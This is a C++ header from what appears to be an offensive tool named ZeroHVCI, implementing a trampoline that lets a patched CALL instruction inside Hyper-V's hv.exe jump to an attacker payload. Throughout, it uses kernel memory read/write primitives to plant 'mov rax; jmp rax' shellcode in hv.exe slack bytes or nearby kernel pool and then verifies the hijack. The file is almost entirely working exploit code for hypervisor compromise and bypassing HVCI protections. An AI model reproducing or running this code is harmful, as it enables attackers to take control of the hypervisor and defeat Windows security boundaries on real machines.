#pragma once
// Trampoline Mechanism for ZeroHVCI Runtime Hyper-V Hijacking
//
// Problem: x86-64 CALL rel32 instruction has a ±2GB range limit.
// When the payload is allocated more than 2GB from hv.exe, the relative
// jump offset overflows and the patch fails.
//
// Solution: Allocate a small trampoline code stub within 2GB of hv.exe
// that performs an absolute jump to the payload. The CALL is patched to
// point to the trampoline instead of directly to the payload.
//
// Trampoline code (12 bytes):
//   mov rax, <64-bit payload address>  ; 48 B8 <8 bytes>
//   jmp rax                             ; FF E0
//
// Memory allocation strategy:
// 1. Try to find existing slack space within hv.exe sections
// 2. Try MmAllocateContiguousMemory near hv.exe physical address
// 3. Try iterative ExAllocatePool calls looking for nearby allocation
// 4. Use VirtualAlloc2 (if available) with MEM_ADDRESS_REQUIREMENTS

#include "exploit.h"
#include "kforge.h"
#include <Windows.h>
#include <cstdint>
#include <cstdio>

namespace zerohvci {
namespace trampoline {

// Trampoline shellcode template
// mov rax, imm64 = 48 B8 <8 bytes>
// jmp rax        = FF E0
constexpr size_t TRAMPOLINE_SIZE = 12;

#pragma pack(push, 1)
struct TrampolineCode
{
    uint8_t MovRaxOpcode[2];     // 48 B8
    uint64_t TargetAddress;      // 8-byte absolute address
    uint8_t JmpRaxOpcode[2];     // FF E0
};
#pragma pack(pop)

static_assert(sizeof(TrampolineCode) == TRAMPOLINE_SIZE, "Trampoline size mismatch");

// Maximum distance for CALL rel32
constexpr int64_t MAX_REL32_DISTANCE = INT32_MAX;
constexpr int64_t MIN_REL32_DISTANCE = INT32_MIN;

// Allocation parameters for proximity search
constexpr size_t PROXIMITY_SEARCH_RANGE = 0x70000000;  // ~1.75GB - stay well within 2GB
constexpr size_t ALLOCATION_ATTEMPTS = 64;             // Number of allocation attempts

//
// Check if an address is within CALL rel32 range of another
//
inline bool IsWithinCallRange(uint64_t from, uint64_t to)
{
    int64_t delta = (int64_t)to - (int64_t)from;
    return delta >= MIN_REL32_DISTANCE && delta <= MAX_REL32_DISTANCE;
}

//
// Calculate relative offset for CALL instruction
// Returns 0 if out of range
//
inline int32_t CalculateCallRva(uint64_t callRip, uint64_t targetAddr)
{
    int64_t rva64 = (int64_t)targetAddr - (int64_t)callRip;

    if (rva64 > MAX_REL32_DISTANCE || rva64 < MIN_REL32_DISTANCE)
    {
        return 0;  // Out of range
    }

    return (int32_t)rva64;
}

//
// Build trampoline shellcode for a given target address
//
inline void BuildTrampolineCode(TrampolineCode* tramp, uint64_t targetAddr)
{
    // mov rax, imm64
    tramp->MovRaxOpcode[0] = 0x48;
    tramp->MovRaxOpcode[1] = 0xB8;
    tramp->TargetAddress = targetAddr;

    // jmp rax
    tramp->JmpRaxOpcode[0] = 0xFF;
    tramp->JmpRaxOpcode[1] = 0xE0;
}

//
// Strategy 1: Find slack space within hv.exe for trampoline
// Look for a run of 0xCC (int 3) or 0x00 in executable sections
//
inline uint64_t FindSlackSpaceInModule(
    uint64_t moduleBase,
    size_t moduleSize,
    const uint8_t* localCopy,
    size_t requiredSize)
{
    // Search for padding/alignment bytes in executable sections
    // Typically between functions there's int3 padding

    const uint8_t* data = localCopy;
    size_t consecutiveSlack = 0;
    size_t slackStart = 0;

    // Skip PE headers (first 0x1000 bytes typically)
    for (size_t i = 0x1000; i < moduleSize - requiredSize; i++)
    {
        // Check for common slack patterns
        bool isSlack = (data[i] == 0xCC ||  // int 3
                        data[i] == 0x00 ||  // zero padding
                        data[i] == 0x90);   // nop

        if (isSlack)
        {
            if (consecutiveSlack == 0)
                slackStart = i;
            consecutiveSlack++;

            if (consecutiveSlack >= requiredSize + 16)  // Extra margin
            {
                // Found enough space - use the middle of the slack area
                uint64_t addr = moduleBase + slackStart + 8;

                // Verify it's still int3/zeros to avoid false positives
                bool allSlack = true;
                for (size_t j = 0; j < requiredSize && allSlack; j++)
                {
                    uint8_t b = data[slackStart + 8 + j];
                    if (b != 0xCC && b != 0x00 && b != 0x90)
                        allSlack = false;
                }

                if (allSlack)
                {
                    printf("[+] Found slack space in hv.exe at offset 0x%llX (%zu bytes)\n",
                        (unsigned long long)slackStart, consecutiveSlack);
                    return addr;
                }
            }
        }
        else
        {
            consecutiveSlack = 0;
        }
    }

    return 0;  // No suitable slack space found
}

//
// Strategy 2: Allocate kernel pool near hv.exe
// Uses iterative allocation attempts hoping to get a nearby address
//
inline uint64_t AllocateNearModule(uint64_t moduleBase, size_t size)
{
    // NonPagedPoolNx type = 512
    const uint32_t NonPagedPoolNx = 512;

    printf("[*] Attempting proximity allocation near 0x%llX...\n", moduleBase);

    // Try multiple allocations and keep the one closest to hv.exe
    uint64_t bestAddr = 0;
    int64_t bestDistance = INT64_MAX;
    std::vector<uint64_t> allocations;
    allocations.reserve(ALLOCATION_ATTEMPTS);

    for (size_t attempt = 0; attempt < ALLOCATION_ATTEMPTS; attempt++)
    {
        // Allocate with varying sizes to hit different pool blocks
        size_t allocSize = size + (attempt * 0x100);

        void* addr = kforge::CallKernelFunctionViaName<void*, uint32_t, size_t>(
            "ExAllocatePool", NonPagedPoolNx, allocSize);

        if (addr)
        {
            uint64_t ptrVal = (uint64_t)addr;
            allocations.push_back(ptrVal);

            int64_t distance = llabs((int64_t)ptrVal - (int64_t)moduleBase);

            if (distance < bestDistance && distance < PROXIMITY_SEARCH_RANGE)
            {
                bestDistance = distance;
                bestAddr = ptrVal;
            }

            // If we found something within range, we can use it
            if (distance < PROXIMITY_SEARCH_RANGE)
            {
                printf("[+] Found suitable allocation at 0x%llX (distance: 0x%llX)\n",
                    ptrVal, (unsigned long long)distance);
            }
        }
    }

    // Free all allocations except the best one
    for (uint64_t addr : allocations)
    {
        if (addr != bestAddr && addr != 0)
        {
            kforge::CallKernelFunctionViaName<void, void*>("ExFreePool", (void*)addr);
        }
    }

    if (bestAddr && bestDistance < PROXIMITY_SEARCH_RANGE)
    {
        printf("[+] Best proximity allocation: 0x%llX (distance: 0x%llX from hv.exe)\n",
            bestAddr, (unsigned long long)bestDistance);
        return bestAddr;
    }

    // If no nearby allocation found, free the best one too
    if (bestAddr)
    {
        kforge::CallKernelFunctionViaName<void, void*>("ExFreePool", (void*)bestAddr);
    }

    printf("[-] Could not allocate kernel memory within range of hv.exe\n");
    return 0;
}

//
// Trampoline allocation result
//
struct TrampolineInfo
{
    bool Success;
    uint64_t TrampolineAddr;    // Kernel address of trampoline
    uint64_t PayloadTarget;     // Original payload entry point
    int32_t CallRva;            // RVA to patch into CALL instruction
    bool UsesSlackSpace;        // True if using hv.exe slack space
};

//
// Main trampoline allocation function
// Attempts all strategies to find a suitable location
//
inline TrampolineInfo AllocateTrampoline(
    uint64_t payloadEntry,
    uint64_t callRip,           // RIP after the CALL instruction
    uint64_t hvModuleBase,
    size_t hvModuleSize,
    const std::vector<uint8_t>& hvLocalCopy)
{
    TrampolineInfo result = { 0 };
    result.PayloadTarget = payloadEntry;

    printf("\n[*] Allocating trampoline for payload at 0x%llX\n", payloadEntry);
    printf("[*] CALL RIP: 0x%llX, hv.exe base: 0x%llX\n", callRip, hvModuleBase);

    // First, check if trampoline is even needed
    int32_t directRva = CalculateCallRva(callRip, payloadEntry);
    if (directRva != 0)
    {
        printf("[+] Payload is within CALL range - no trampoline needed\n");
        result.Success = true;
        result.TrampolineAddr = payloadEntry;
        result.CallRva = directRva;
        result.UsesSlackSpace = false;
        return result;
    }

    printf("[*] Payload too far (>2GB) - trampoline required\n");

    // Strategy 1: Find slack space within hv.exe
    uint64_t slackAddr = FindSlackSpaceInModule(
        hvModuleBase, hvModuleSize, hvLocalCopy.data(), TRAMPOLINE_SIZE);

    if (slackAddr)
    {
        // Verify slack space is within CALL range
        int32_t slackRva = CalculateCallRva(callRip, slackAddr);
        if (slackRva != 0)
        {
            printf("[+] Using hv.exe slack space for trampoline\n");

            // Build and write trampoline
            TrampolineCode tramp;
            BuildTrampolineCode(&tramp, payloadEntry);

            if (WriteKernelMemory((PVOID)slackAddr, &tramp, sizeof(tramp)))
            {
                result.Success = true;
                result.TrampolineAddr = slackAddr;
                result.CallRva = slackRva;
                result.UsesSlackSpace = true;
                return result;
            }
            else
            {
                printf("[-] Failed to write trampoline to slack space\n");
            }
        }
    }

    // Strategy 2: Allocate kernel pool near hv.exe
    uint64_t poolAddr = AllocateNearModule(hvModuleBase, TRAMPOLINE_SIZE + 0x10);

    if (poolAddr)
    {
        int32_t poolRva = CalculateCallRva(callRip, poolAddr);
        if (poolRva != 0)
        {
            printf("[+] Using allocated pool for trampoline\n");

            // Build and write trampoline
            TrampolineCode tramp;
            BuildTrampolineCode(&tramp, payloadEntry);

            if (WriteKernelMemory((PVOID)poolAddr, &tramp, sizeof(tramp)))
            {
                result.Success = true;
                result.TrampolineAddr = poolAddr;
                result.CallRva = poolRva;
                result.UsesSlackSpace = false;
                return result;
            }
            else
            {
                printf("[-] Failed to write trampoline to pool\n");
                // Free the allocation on failure
                kforge::CallKernelFunctionViaName<void, void*>("ExFreePool", (void*)poolAddr);
            }
        }
        else
        {
            printf("[-] Pool allocation still not within CALL range\n");
            kforge::CallKernelFunctionViaName<void, void*>("ExFreePool", (void*)poolAddr);
        }
    }

    printf("[-] CRITICAL: Could not allocate trampoline within 2GB of CALL site\n");
    printf("[-] This is rare but can happen on systems with extreme memory fragmentation\n");
    printf("[-] Try rebooting and running again, or check for memory pressure\n");

    result.Success = false;
    return result;
}

//
// Verify trampoline is working correctly
//
inline bool VerifyTrampoline(uint64_t trampolineAddr)
{
    TrampolineCode readBack = { 0 };

    if (!ReadKernelMemory((PVOID)trampolineAddr, &readBack, sizeof(readBack)))
    {
        printf("[-] Could not read back trampoline for verification\n");
        return false;
    }

    // Verify opcodes
    if (readBack.MovRaxOpcode[0] != 0x48 ||
        readBack.MovRaxOpcode[1] != 0xB8 ||
        readBack.JmpRaxOpcode[0] != 0xFF ||
        readBack.JmpRaxOpcode[1] != 0xE0)
    {
        printf("[-] Trampoline verification failed - opcodes mismatch\n");
        printf("    Expected: 48 B8 ... FF E0\n");
        printf("    Got: %02X %02X ... %02X %02X\n",
            readBack.MovRaxOpcode[0], readBack.MovRaxOpcode[1],
            readBack.JmpRaxOpcode[0], readBack.JmpRaxOpcode[1]);
        return false;
    }

    printf("[+] Trampoline verified: jumps to 0x%llX\n", readBack.TargetAddress);
    return true;
}

//
// Print trampoline information
//
inline void PrintTrampolineInfo(const TrampolineInfo& info)
{
    printf("\n========================================\n");
    printf("  Trampoline Information\n");
    printf("========================================\n");
    printf("Success:        %s\n", info.Success ? "Yes" : "No");
    printf("Trampoline At:  0x%llX\n", info.TrampolineAddr);
    printf("Payload Target: 0x%llX\n", info.PayloadTarget);
    printf("CALL RVA:       0x%08X\n", info.CallRva);
    printf("Uses Slack:     %s\n", info.UsesSlackSpace ? "Yes (hv.exe)" : "No (Pool)");
    printf("========================================\n\n");
}

} // namespace trampoline
} // namespace zerohvci
